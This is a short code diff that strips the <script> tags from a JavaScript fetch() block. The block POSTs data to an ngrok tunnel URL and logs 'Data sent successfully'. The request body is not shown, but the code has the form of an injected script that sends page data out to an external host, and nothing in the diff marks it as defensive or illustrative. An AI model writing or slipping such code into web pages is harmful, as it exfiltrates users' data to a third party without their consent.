@@ -1,4 +1,3 @@
-<script>
   fetch('https://osprey-gorgeous-gazelle.ngrok-free.app/', {
     method: 'POST',
     headers: {
@@ -12,4 +11,3 @@
   }).then(response => response.text())
     .then(data => console.log('Data sent successfully:', data))
     .catch(error => console.error('Error:', error));
-</script>
